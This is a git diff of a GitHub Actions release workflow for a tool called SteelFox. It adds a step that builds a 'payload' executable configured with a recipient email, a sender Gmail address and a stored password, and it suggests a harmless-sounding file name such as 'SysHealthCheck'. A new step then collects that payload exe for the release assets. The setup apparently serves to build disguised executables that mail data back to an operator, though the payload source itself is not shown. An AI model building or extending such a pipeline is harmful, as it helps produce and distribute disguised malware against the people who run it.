@@ -3,28 +3,41 @@ name: SteelFox Release Builder
 on:
   push:
     tags:
-      - 'v*' # Déclenche le workflow sur les tags comme v1.0.0
-  workflow_dispatch: # Permet de lancer le workflow manuellement depuis l'interface GitHub
+      - 'v*'
+  workflow_dispatch:
+    inputs:
+      receiver:
+        description: 'Recipient email for the generated payload'
+        required: false
+        default: ''
+      sender:
+        description: 'Sender Gmail (leave empty to use receiver)'
+        required: false
+        default: ''
+      payload_name:
+        description: 'Output exe name (no extension, e.g. SysHealthCheck)'
+        required: false
+        default: 'output'
 
 jobs:
   build-and-release:
     name: Build Executables and Create Release
     runs-on: windows-latest
-    
+
     permissions:
-      contents: write # Nécessaire pour créer la release et uploader les assets
+      contents: write
 
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
         with:
-          fetch-depth: 0 # Récupère tout l'historique pour de meilleurs changelogs
+          fetch-depth: 0
 
       - name: Set up Python 3.10
         uses: actions/setup-python@v5
         with:
           python-version: '3.10'
-          cache: 'pip' # Active le cache pour accélérer les builds
+          cache: 'pip'
 
       - name: Install Dependencies
         run: |
@@ -33,18 +46,43 @@ jobs:
           pip install pyinstaller pillow
 
       - name: Build Console Version
-        run: |
-          python build_console.py
-          
-      - name: Build Builder Version
-        run: |
-          python build_builder.py
+        run: python build_console.py
 
-      - name: Verify Executables
+      - name: Build Builder GUI Version
+        run: python build_builder.py
+
+      - name: Build Payload Exe (optional - requires email secrets or inputs)
+        # Runs only when credentials are provided (via secrets OR workflow_dispatch inputs)
+        env:
+          SF_RECEIVER: ${{ github.event.inputs.receiver || secrets.SF_RECEIVER }}
+          SF_SENDER:   ${{ github.event.inputs.sender   || secrets.SF_SENDER }}
+          SF_PASSWORD: ${{ secrets.SF_PASSWORD }}
+          SF_NAME:     ${{ github.event.inputs.payload_name || secrets.SF_NAME || 'output' }}
+          SF_OUTPUT:   '.'
+        if: |
+          (github.event.inputs.receiver != '' || secrets.SF_RECEIVER != '') &&
+          secrets.SF_PASSWORD != ''
+        run: python builder_cli.py
+        continue-on-error: true  # Don't fail the whole release if no creds provided
+
+      - name: Verify Required Executables
         run: |
-          if (!(Test-Path "steelfox_console.exe")) { throw "steelfox_console.exe manquant!" }
-          if (!(Test-Path "steelfox_builder.exe")) { throw "steelfox_builder.exe manquant!" }
-          Write-Host "Les deux exécutables ont été générés avec succès."
+          if (!(Test-Path "steelfox_console.exe")) { throw "steelfox_console.exe missing!" }
+          if (!(Test-Path "steelfox_builder.exe")) { throw "steelfox_builder.exe missing!" }
+          Write-Host "Core executables verified."
+
+      - name: Collect Release Assets
+        id: collect
+        run: |
+          $files = @("steelfox_console.exe", "steelfox_builder.exe")
+          $payload = Get-Item "*.exe" -Exclude "steelfox_console.exe","steelfox_builder.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
+          if ($payload) {
+            Write-Host "Payload exe found: $($payload.Name)"
+            $files += $payload.FullName
+            echo "payload_found=true" >> $env:GITHUB_OUTPUT
+          } else {
+            echo "payload_found=false" >> $env:GITHUB_OUTPUT
+          }
 
       - name: Create GitHub Release
         uses: softprops/action-gh-release@v2
@@ -52,7 +90,7 @@ jobs:
           name: SteelFox Release ${{ github.ref_name }}
           draft: false
           prerelease: false
-          generate_release_notes: true # Génère automatiquement un beau changelog basé sur les PRs et commits
+          generate_release_notes: true
           files: |
             steelfox_console.exe
             steelfox_builder.exe
